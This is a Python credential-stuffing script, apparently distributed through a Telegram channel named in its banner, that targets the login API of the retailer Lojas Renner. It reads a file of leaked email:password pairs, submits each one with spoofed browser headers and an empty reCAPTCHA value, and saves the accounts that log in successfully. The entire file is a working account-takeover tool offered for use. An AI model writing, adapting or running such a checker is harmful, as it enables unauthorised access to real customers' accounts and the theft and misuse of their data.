import requests
import json
import os
from colorama import Fore, Style, init

init(autoreset=True)

urlzinha = "https://www.lojasrenner.com.br/rest/model/atg/rest/SessionConfirmationActor/getSessionConfirmationNumberAsString?pushSite=rennerBrasilDesktop"
principal = "https://www.lojasrenner.com.br/rest/model/atg/userprofiling/ProfileActor/login?pushSite=rennerBrasilDesktop"

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/json",
    "origin": "https://www.lojasrenner.com.br",
    "referer": "https://www.lojasrenner.com.br/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36"
}

def silviosantos(session):
    response = session.get(urlzinha, headers=headers)
    if response.status_code == 200:
        try:
            session_data = response.json()
            sessao_confirmar = session_data.get("sessionConfirmationNumber")
            if sessao_confirmar:
                os.environ['SESSION_CONFIRMATION_NUMBER'] = sessao_confirmar
                return sessao_confirmar
            else:
                print(Fore.RED + "Erro")
                return None
        except json.JSONDecodeError:
            print(Fore.RED + "Erro")
            return None
    else:
        print(Fore.RED + f"Erro")
        return None

def login(session, email, senha):
    sessao_confirmar = os.getenv('SESSION_CONFIRMATION_NUMBER')
    if not sessao_confirmar:
        print(Fore.RED + "Erro")
        return "DIE"

    login_payload = {
        "realmId": "renner",
        "g-recaptcha-response": "",
        "login": email,
        "password": senha,
        "_dynSessConf": sessao_confirmar
    }

    response = session.post(principal, headers=headers, data=json.dumps(login_payload))

    if response.status_code == 200:
        if "{}" in response.text:
            return "LIVE"
        else:
            return "DIE"
    else:
        return "DIE"

def main():
    desenho = """
╦═╗╔═╗╔╗╔╔╗╔╔═╗╦═╗
╠╦╝║╣ ║║║║║║║╣ ╠╦╝
╩╚═╚═╝╝╚╝╝╚╝╚═╝╩╚═ | CHK LOJAS RENNER - t.me/duckettstoneprincipal
"""

    print(Fore.RED + desenho)
    iniciovei = input("DB (email:senha): ")
    ondesalva = "livesalva.txt"

    try:
        with open(iniciovei, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print(Fore.RED + "erro: arquivo não encontrado senhor(a)")
        return

    with open(ondesalva, 'w') as output_file:
        with requests.Session() as session:
            sessao_confirmar = silviosantos(session)
            if not sessao_confirmar:
                return

            for line in lines:
                line = line.strip()
                if not line:
                    continue
                email, senha = line.split(':')
                result = login(session, email, senha)
                if result == "LIVE":
                    output_file.write(f"{email}:{senha}\n")
                    print(Fore.GREEN + f"✅ LIVE | CONTA RENNER - {email}")
                else:
                    print(Fore.RED + "❌ - DIE")

if __name__ == "__main__":
    main()
